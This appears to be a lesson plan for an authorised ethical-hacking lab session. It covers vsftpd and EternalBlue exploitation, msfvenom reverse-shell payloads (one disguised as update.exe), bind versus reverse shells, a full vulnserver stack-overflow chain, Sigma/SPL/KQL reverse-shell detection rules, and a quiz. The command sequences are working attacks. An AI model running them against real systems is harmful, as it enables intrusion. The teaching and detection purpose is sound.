    What you hand in today

    Two things. A foothold record — per host: the exploit or credential that got you in, the payload, the shell type, and what user context you landed as (e.g. NT AUTHORITY\SYSTEM on Win7 via EternalBlue vs a low-priv service account on Metasploitable2). And one working reverse-shell / exploit detection rule (Sigma / SPL / KQL) from evidence you generate yourself. The foothold record is Session 6's input; the rule is the job.

    Authorisation — read before anything

    Every exploit today runs against your own host-only lab — Metasploitable2, Windows 7, and the ceh.lab domain. Firing an exploit, catching a shell, or overflowing a buffer on any host you do not own is a criminal offence. The lab hands you the target and the authorisation; that authorisation does not travel.

    The spine of the session

    Exploitation is loud and leaves artefacts: a crashed service, a new process, a service account suddenly spawning cmd.exe, an outbound connection to the attacker. Recon and scanning could be argued as research — a reverse shell cannot. So every attack today carries its SOC flip (process creation 4688 / Sysmon 1, network connection Sysmon 3, IDS signatures), and the session ends with you writing the detection rule from evidence you generated.

    Pre-flight: Targets Up, Handler Ready

    Ninety seconds of checks now saves a dead lab later. Confirm the targets answer and Metasploit starts.

    Why a pre-flight

    Every lab today fires at a specific host. If Win7 is off, or Metasploit's database is not connected, you lose ten minutes mid-exploit. Confirm the range now, once.

    1. Confirm the targets are reachable from Kali on the host-only network.

      ✓ Verification

      • Metasploitable2 replies; Win7 shows 445/tcp open
    2. Start Metasploit and connect its database (fast search + loot storage). 
      sudo msfdb init          # once per machine

      ✓ Verification

      • db_status reports Connected

    3. Confirm your S4 credentials still work (you will need one in Lab 7).

      ✓ Verification

      • At least one S4 credential still authenticates to the domain

    S05 · P04Method · the whole path⏱ 8 min

    From a Matched CVE to a Running Process

    Every exploit — manual or Metasploit — walks the same six steps. See them once and the tools stop being magic.

    Why the pipeline before the tools

    In Session 4 you ended each host with "public exploit? yes." That yes is the entry to this pipeline. Whether you type the exploit by hand or let Metasploit drive, the shape is identical — and knowing the shape is what lets you debug a broken exploit instead of just trying another.

    ▶ Prove it — find the PoC for a service you matched in S4
    searchsploit vsftpd 2.3.4
# vsftpd 2.3.4 - Backdoor Command Execution | unix/remote/49757.py
# vsftpd 2.3.4 - Backdoor Command Execution (Metasploit) | unix/remote/17491.rb

    You should see: at least one hit named for the exact version, and a (Metasploit) line — a reliable module exists. That is step 2 done; Lab 1 does steps 3–6 by hand.

    The rule of step 3

    Read the exploit before you run it. A framework can find, configure and fire for you — it cannot understand the exploit for you. That understanding is the difference between an ethical hacker and someone running strangers' code.

    S05 · P05Hands-on · everyone · steps 3–6⏱ 15 min

    Lab 1 — Exploit vsftpd 2.3.4 By Hand

    No framework. You will trigger a backdoor with a raw connection and catch a root shell — so Metasploit never feels like magic.

    Why manual first

    Target & authorisation

    1. Step 3 — read the PoC. The mechanism, in one line: a login whose username ends in :) makes vsftpd open a root shell on 6200. No password needed — the trigger is the smiley.

      ✓ Verification

    S05 · P06Method · demystified⏱ 9 min

    The Framework: One Model, Four Module Types

    Metasploit is not magic — it is an exploit plus a payload plus options, producing a session. Learn that shape and every module makes sense.

    Why the model before the commands

    Students who memorise use / set / exploit get lost the moment a module behaves differently. Students who know exploit + payload + options → session can drive any of the 2000+ modules. Here is the whole mental model.

    msfconsole — the 7-part frame

    What it isThe console front-end to the Metasploit Framework — a searchable library of exploits, payloads, auxiliary and post modules with a common use / set / run workflow.
    Why it existsTo make reliable, tested exploits repeatable — so you spend your thinking on which attack and what user you land as, not on re-implementing a PoC each time.
    The methodsearch the vuln → use the module → show options → set the required ones → check (if supported) → exploit. Pick your payload deliberately — it decides what comes back.
    Real syntax
    msfconsole -q
search ms17-010
use exploit/windows/smb/ms17_010_eternalblue
show options
set RHOSTS 192.168.56.107
set LHOST 192.168.56.101
exploit          # or: run
    Read the output[+] ... - The target is vulnerable. then [*] Meterpreter session 1 opened. No session = a required option is blank, the payload could not connect back, or the target is patched.
    What it feedsA session → the foothold record → Session 6's privilege escalation.
    SOC flipLoud. The exploit itself, the new child process, and the reverse connection all generate events (4688 / Sysmon 1 & 3). EternalBlue in particular is flagged by IDS and EDR in near-real-time — you will write that rule in Lab 9.
    ▶ Prove it — search and inspect a module (no firing)
    msfconsole -q
search type:exploit vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor
show options     # note: RHOSTS is the only required option

    You should see: the module loads and show options lists RHOSTS as required — the whole of Lab 1, wrapped in one module. Lab 2 fires it.

    The honest line about the framework

    Metasploit automates steps 4–6 of the pipeline brilliantly. It does not automate step 3 — understanding the exploit — and it does not teach you what to do when a module fails. That is why we did Lab 1 by hand first, and why the exam and real engagements still test manual exploitation.

    EternalBlue — One CVE, End to End

    The cleanest CVE→exploit→SYSTEM demonstration in the course — and the exact MS17-010 you matched against Windows 7 in Session 4.

    Why this is the flagship example

    In Session 4 you ran nmap --script smb-vuln-ms17-010 and it came back vulnerable. You wrote "public exploit: yes" in the access plan. This is that exploit — the NSA-developed SMBv1 flaw leaked in 2017 — taken all the way to a SYSTEM shell, the highest privilege on Windows. One CVE, the whole pipeline, in one diagram.

    S05 · P10Method · why reverse wins⏱ 8 min

    Bind vs Reverse — the One Image That Explains Shells

    Two ways a shell connects. One is blocked by every firewall; the other walks straight out. Step through both.

    Why this decides whether your exploit even connects

    Your exploit lands and runs a payload — but a shell is a connection, and connections have a direction. Get the direction wrong and the firewall silently eats your shell and you think the exploit failed. This one distinction explains 90% of "it worked in the lab but not on the engagement."

    ▶ Prove it — see the direction in one line each (concept)
    # BIND  : victim opens a port, attacker dials in
nc -lvnp 4444        # (this runs ON the victim in a bind payload)
# REVERSE: attacker opens the port, victim dials out
nc -lvnp 443         # (this runs ON YOUR kali; the victim connects back)

    You should see: the only difference is who runs the listener. In a reverse shell your Kali listens and the target connects to you — which is the setup for Lab 4 and Lab 5.

    The rule

    Reverse shells beat firewalls because firewalls fear what comes IN, not what goes OUT. Default to reverse; reach for bind only when the target cannot make outbound connections but you can reach it inbound (rare, but it happens on flat internal networks).

    S05 · P11Hands-on · everyone · the failure teaches⏱ 12 min

    Lab 4 — Watch the Bind Shell Die

    Run both shell types against the same host. The bind shell gets blocked; the reverse shell walks out. The failure is the lesson.

    What you are about to do

    You will start a bind shell on a target behind its host firewall and fail to reach it — then flip to a reverse shell and succeed. Feeling the bind shell fail is worth more than being told it would.

    1. Bind shell — and its failure. Generate a bind payload, run it on the target (firewall on), and try to connect in. 
      msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=4444 -f exe -o bind.exe
# run bind.exe on WIN10-TGT01 (Defender/firewall ON)
msfconsole -q
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/bind_tcp
set RHOST 192.168.56.108
set LPORT 4444
run        # => hangs / times out — the firewall drops your inbound connection

      ✓ Verification

      • The handler cannot connect — it hangs or times out. That is the firewall, not a mistake
    2. Reverse shell — the same box, opposite direction. 
      msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.56.101 LPORT=443 -f exe -o rev.exe
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.56.101
set LPORT 443
run        # now WAIT — run rev.exe on the target
      msf6 exploit(multi/handler)reverse_tcp handler
      run [*] Started reverse TCP handler on 192.168.56.101:443 [*] (waiting — target must execute rev.exe) [*] Sending stage (201798 bytes) to 192.168.56.108 [*] Meterpreter session 1 opened (192.168.56.101:443 -> 192.168.56.108:51422) getuid
      Port 443 — the reverse shell hides in what looks like normal HTTPS egress.

      ✓ Verification

      • [*] Meterpreter session 1 opened the moment the target runs the payload — the outbound connection was allowed
    What you proved

    The same target, the same tool, opposite results — decided only by connection direction. You will never again wonder why an exploit "worked but gave no shell." Default to reverse.

    S05 · P12Method · payloads⏱ 9 min

    Payloads: Staged vs Stageless, and msfvenom

    Two ways to deliver the same shell. One is small and fetches the rest; one is whole and self-contained. The / in the payload name tells you which.

    Why one character changes everything

    windows/x64/meterpreter/reverse_tcp vs windows/x64/meterpreter_reverse_tcp. A slash means staged; an underscore means stageless. That one character decides your payload's size, its reliability, and whether your handler must stay up — so you need to read it.

    msfvenom — the 7-part frame

    What it isThe Metasploit payload generator — it builds a standalone payload (exe, elf, php, raw shellcode…) you deliver outside a Metasploit exploit and catch with a handler.
    Why it existsTo weaponise a payload for any delivery: a file the user runs, a web upload, shellcode for a buffer overflow. When you cannot use a full exploit module, you still need the shell.
    The methodChoose payload (-p) → set LHOST/LPORT → choose a format (-f) → write it out. Then catch it with multi/handler set to the same payload.
    Real syntax
    msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.56.101 LPORT=443 -f exe -o rev.exe
msfvenom -p linux/x64/shell_reverse_tcp \
  LHOST=192.168.56.101 LPORT=443 -f elf -o rev.elf
msfvenom -p php/reverse_php LHOST=... LPORT=... -f raw -o sh.php
msfvenom --list payloads | grep meterpreter
    Read the outputPayload size: 201798 bytes — note staged payloads are small, stageless large. Saved as: rev.exe. Wrong -f for the target = a file that will not run.
    What it feedsA payload file + a multi/handler waiting to catch it — Lab 5. And shellcode (-f c) for the buffer overflow in Lab 8.
    SOC flipThe callback is the loud part. The file may sit quietly, but the moment it runs it makes an outbound connection to you (Sysmon 3) and spawns from an unexpected parent (Sysmon 1 / 4688). Encoders (-e) change the bytes but encoding is NOT AV evasion — modern AV/EDR still flags meterpreter. Real evasion is Session 6/7.
    ▶ Prove it — prove staged is smaller than stageless
    msfvenom -p windows/x64/meterpreter/reverse_tcp   LHOST=192.168.56.101 LPORT=443 -f exe -o staged.exe
msfvenom -p windows/x64/meterpreter_reverse_tcp    LHOST=192.168.56.101 LPORT=443 -f exe -o stageless.exe
ls -la staged.exe stageless.exe

    You should see: stageless.exe is noticeably larger — it carries the whole payload, while staged.exe only carries the stager that fetches it. One character (/ vs _), a real size difference.

    Encoding is not evasion (say it in class)

    Students always ask "does -e shikata_ga_nai beat antivirus?" No. Encoders exist to remove bad characters and were never designed to evade modern AV — signatures caught them years ago. Teach it honestly: encoding solves bad chars (crucial in Lab 8's buffer overflow), AV evasion is a separate, harder topic in Session 6/7.

    Lab 5 — Build a Payload, Catch the Shell

    The pattern behind every non-module exploit: generate a reverse payload, stand up a handler, run it, catch it.

    What you are about to do

    Not every foothold comes from a Metasploit exploit module. Often you generate a payload with msfvenom, deliver it however you can, and catch it with a handler. This is that loop — and it generates the reverse-shell evidence you will detect in Lab 9.

    Target & authorisation

    Deliver + run the payload on WIN10-TGT01 · 192.168.56.108 (your own VM). In a real engagement delivery is the hard part; here we hand-run it to focus on the catch.

    1. Generate a staged reverse payload. 
      msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.56.101 LPORT=443 -f exe -o update.exe
# Payload size: 201798 bytes ; Saved as: update.exe

      ✓ Verification

      • update.exe is written; note the payload size printed
    2. Stand up the handler FIRST (staged payloads need it listening before the callback). 
      msfconsole -q

      ✓ Verification

      • Handler reports Started reverse TCP handler on 192.168.56.101:443
    3. Run the payload on the target, catch the shell, confirm execution. 
      meterpreter > getuid

      msf6 exploit(multi/handler)reverse_tcp

      ✓ Verification

      • Meterpreter session opened
      • You recorded the user context in the foothold record
      • You saved the Sysmon 1/3 + 4688 evidence (or the fallback) for Lab 9
    Deliberate failure to feel: handler down

    Try running the payload with the handler stopped. Nothing comes back — the stager connected, found no one home, and the stage never shipped. That is the staged-payload trap from the theory page, live. Start the handler, run again, and it lands.

    What you produced

    A caught reverse shell you built yourself — and the exact network + process evidence a SOC uses to catch it. You are now on both sides of the same event, which is the whole point of Lab 9.

    S05 · P15Method · keep the shell usable⏱ 7 min

    From a Dumb Shell to a Real One

    The shell you first catch is half-broken — no tab-complete, no sudo, dies on Ctrl-C. Three upgrades fix it.

    Why your first shell frustrates you

    A raw reverse shell is a dumb shell: no job control, no terminal features, and one careless Ctrl-C kills it. Before you do real work you upgrade it — to a proper TTY, or all the way to meterpreter. This is a five-minute skill that saves every engagement after.

    ▶ Prove it — upgrade a dumb Linux shell to a TTY (the muscle memory)
    python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl-Z to background
stty raw -echo; fg

    S05 · P19Method · why exploits exist⏱ 12 min

    The Buffer Overflow — Watch the Stack

    The mechanism under half of all memory-corruption RCE. Step through the stack and see how too much data becomes your code running.

    Why we teach the classic overflow

    Modern mitigations (DEP, ASLR, stack canaries) make the naive stack overflow a teaching model, not a copy-paste exploit — and we will say so. But nothing else explains why exploits exist at all as cleanly: a program that trusts the size of its input hands you control of what runs next. Learn this and "RCE" stops being a magic word.

    The honest currency note — say it out loud

    On a modern target this naive version is stopped by DEP/NX (the stack is not executable), ASLR (module addresses move, so a hardcoded JMP ESP fails), and stack canaries (a guard value detects the overwrite). Real-world exploitation defeats these (ROP, info leaks) — that is OSED-level work, well beyond CEH. We teach the model because it explains the class; the countermeasures are the exam answer.

    ▶ Prove it — prove you control EIP (concept, on the lab target)
    # 1) crash it
./fuzzer.py            # sends growing A's until vulnserver dies
# 2) find the offset
msf-pattern_create -l 2000 > pat.txt        # send this, read EIP
msf-pattern_offset -l 2000 -q 39694438      # => Exact match at offset 1978

    You should see: Exact match at offset 1978 — the precise number of bytes before EIP. Controlling EIP is the milestone; Lab 8 walks the rest.

    Why this page matters even if you never write one

    A buffer overflow is what "RCE" means underneath. Whether it is EternalBlue in the kernel or a web app deserialising untrusted data, the shape is the same: untrusted input reaches a place that decides what code runs. Now you can read a CVE and know what it is doing.

    S05 · P20Hands-on · everyone · guided + saved-state⏱ 20 min

    Lab 8 — A Guided Stack Overflow, End to End

    The one you will remember: fuzz a real vulnerable service to a crash, control EIP, dodge the bad characters, and land a shell.

    How this lab is run

    This is the hardest topic to fit in the time, so it is a guided demo you follow along, with a saved state at every step so a stuck student can jump to the next milestone and still finish. Primary target: Windows vulnserver + Immunity Debugger + mona.py. A Linux gdb/pwndbg binary is provided as a no-VM fallback.

    Targets & authorisation

    Primary: vulnserver on WIN10-TGT01 with Immunity Debugger attached (both provided). Fallback: ./vuln on Kali (compiled -fno-stack-protector -z execstack -no-pie). Both are intentionally vulnerable teaching apps — never point this at anything else.

    1. Step A — fuzz to a crash. Send growing input to the TRUN command until vulnserver dies and Immunity shows the crash. 
      python3 fuzzer.py 192.168.56.108 9999     # sends TRUN /.:/ + A*n, growing
# Immunity: EIP = 41414141  (crashed) ; saved-state: crash-01.snapshot

      ✓ Verification

      • Immunity shows EIP 41414141 — the service crashed under your input
    2. Step B — find the offset. 
      msf-pattern_create -l 3000 > pattern.txt     # send as the TRUN argument
# read EIP in Immunity, then:
msf-pattern_offset -l 3000 -q      # => Exact match at offset 2003

      ✓ Verification

      • You have the exact offset to EIP (e.g. 2003); saved-state: offset.txt
    3. Step C — confirm EIP control. Send A*offset + "BBBB" + C*rest; EIP should read 42424242. 
      buf = b"A"*2003 + b"BBBB" + b"C"*400
# Immunity: EIP = 42424242  -> you own EIP

      ✓ Verification

      • EIP = 42424242 — precise control proven
    4. Step D — find bad characters. Send all bytes \x01..\xff, compare in memory with !mona bytearray, drop the ones that mangle. 
      !mona bytearray -b "\x00"
# send bytes after EIP, then compare:
!mona compare -f bytearray.bin -a    # => bad chars: \x00 \x0a \x0d

      ✓ Verification

      • You have the bad-character list (commonly \x00 \x0a \x0d); saved-state: badchars.txt
    5. Step E — find a JMP ESP in a module without ASLR/rebase, and set EIP to it. 
      !mona jmp -r esp -cpb "\x00\x0a\x0d"        # => 0x625011AF  (essfunc.dll, no protections)
# EIP = 0x625011AF (little-endian: \xAF\x11\x50\x62)

      ✓ Verification

      • !mona jmp returns a usable JMP ESP address in a non-protected module
    6. Step F — generate shellcode, land the shell. 
      msfvenom -p windows/shell_reverse_tcp LHOST=192.168.56.101 LPORT=443 \
  -b "\x00\x0a\x0d" -f py -v shellcode
# final buffer: A*2003 + JMP_ESP + NOPs*16 + shellcode
nc -lvnp 443     # catch it
      kali@lab: ~nc -lvnp 443
      nc -lvnp 443 listening on [any] 443 ... connect to [192.168.56.101] from 192.168.56.108 51999 C:\Users\lab\Desktop> whoami win10-tgt01\lab
      Six steps, one shell. The NOP sled (\x90) gives the landing a margin.

      ✓ Verification

      • nc catches a shell from the target — the overflow became RCE
      • Foothold record: host=WIN10, via=BOF (vulnserver), payload=shell_reverse_tcp
    If you get stuck

    Every step has a saved state — load offset.txt, badchars.txt or the pre-built final buffer and keep moving. Finishing the chain once, even with hints, teaches more than grinding one step. The Linux gdb fallback follows the identical fuzz→offset→control→shellcode logic if Immunity misbehaves.

    What you produced

    You turned too much input into your shell — the single most important mechanism in offensive security, done with your own hands. You will never read "stack-based buffer overflow" in a CVE the same way again.

    Every Shell Today, and the Log It Left

    You have exploited all afternoon. Here is the other side — the process, network and IDS events a SOC analyst actually triages.

    Why exploitation is where detection pays off

    Recon is quiet and cracking is offline — but exploitation runs code and opens a connection, and both are loud. A service that suddenly spawns cmd.exe, an outbound connection from a web server to a random host, an EternalBlue signature — these are high-signal. Learn the pairs and you can sit on either side.

    The rule you are about to write

    A shell is a process with a parent and a connection. The most durable detection is not the exploit bytes (they change) but the behaviour after: the wrong parent spawning a shell, and that shell reaching out. That is your Lab 9 rule.

    Lab 9 — Detect the Shell You Just Caught

    Become the SOC analyst who catches you — from the process and network evidence your own exploits generated this session.

    You need the evidence from Labs 3–5

    Have your saved Sysmon/Security logs open (saved/lab3_eternalblue_sysmon.evtx, saved/lab5_revshell_sysmon.evtx). No lab? The fallbacks contain the exact events described below.

    The worked rule — Sigma (behavioural, exploit-agnostic)

    The durable detection is the behaviour, not the exploit: a shell interpreter whose parent is a server/service and that then makes an outbound connection. Written once in Sigma, it fires on EternalBlue, msfvenom, a web-shell — any delivery.

    title: Reverse Shell - Server Process Spawns Interpreter
logsource:
  category: process_creation
  product: windows
detection:
  parent_server:
    ParentImage|endswith:
      - '\services.exe'
      - '\w3wp.exe'
      - '\sqlservr.exe'
      - '\httpd.exe'
  shell_child:
    Image|endswith:
      - '\cmd.exe'
      - '\powershell.exe'
  condition: parent_server and shell_child
tags: [attack.execution, attack.t1059, attack.t1210]
level: high

    Pair it with a network rule — Sysmon Event ID 3 where the initiating Image is cmd.exe/ powershell.exe connecting to a non-internal address — and a single reverse shell trips both.

    Now you write one — pick your platform

    Splunk (SPL) — complete this skeleton

    index=win EventCode=1
| search parent_process_name IN ("services.exe","w3wp.exe","sqlservr.exe")
         process_name IN ("cmd.exe","powershell.exe")
| stats count by Computer, parent_process_name, process_name, _time
| where ____   <-- your threshold / correlation with a Sysmon 3 egress

    Microsoft Sentinel (KQL) — complete this skeleton

    DeviceProcessEvents
| where InitiatingProcessFileName in~ ("services.exe","w3wp.exe","sqlservr.exe")
| where FileName in~ ("cmd.exe","powershell.exe")
| join kind=inner (DeviceNetworkEvents
    | where InitiatingProcessFileName in~ ("cmd.exe","powershell.exe"))
    on DeviceId
| where ____   <-- your outbound / non-RFC1918 condition
    1. Read the evidence and name the attack from the logs alone — do not look at your own commands.

      ✓ Verification

      • You identified: parent process, the spawned shell, the outbound destination and port
    2. Write ONE complete, working rule in Sigma, SPL or KQL that would fire on your reverse shell.

      ✓ Verification

      • The rule keys on the parent→child relationship (not the exploit bytes)
      • It correlates or thresholds so a normal admin cmd.exe does not drown it in false positives
    3. Test it against a benign baseline — would a normal user opening PowerShell trip it? Tune the parent list.

      ✓ Verification

      • You can state one false-positive source and how your rule avoids it
    What you produced

    One working reverse-shell detection rule, from evidence you generated by attacking. The honest point to end on: EDR and IDS flag meterpreter and EternalBlue in near-real-time — the modern attacker's hard problem is not getting a shell, it is keeping it quiet, which is Session 6/7.

    S05 · P25Wrap-up · self-scoring⏱ 8 min

    Knowledge Check

    Six questions. Answer before you reveal — each explains the "why," not just the letter.

    Q1Why do reverse shells succeed where bind shells fail on most networks?

    • Reverse shells are encrypted and bind shells are not
    • Bind shells need administrator rights
    • The target connects OUT in a reverse shell, and firewalls allow outbound far more than inbound
    • Reverse shells use UDP, which bypasses firewalls

    Q2What does the / in windows/x64/meterpreter/reverse_tcp tell you?

    • It is a bind payload
    • It is STAGED — a small stager fetches the full payload, so the handler must be listening
    • It is stageless and self-contained
    • It only works on x86

    Q3Which step of the exploitation pipeline does Metasploit NOT do for you?

    • Firing the exploit
    • Configuring RHOSTS/LHOST
    • Reading and understanding what the exploit does before you run it
    • Catching the shell

    Q4Why does EternalBlue give you SYSTEM directly, with no privilege escalation?

    • It corrupts kernel memory in the SMB service, which runs as SYSTEM
    • It cracks the Administrator password
    • It disables UAC first
    • It uses a stolen token

    Q5In a stack overflow, why is "controlling EIP" the milestone?

    • It leaks the stack canary
    • EIP is the return address — control it and you control what code runs next
    • It disables DEP
    • It gives you the base address of the binary

    Q6What is the most durable way to detect a reverse shell, regardless of the exploit used?

    • Signature the exploit's bytes on the wire
    • Block port 4444
    • Alert when a server/service process spawns a shell interpreter that then makes an outbound connection
    • Look for the string 'meterpreter' in memory
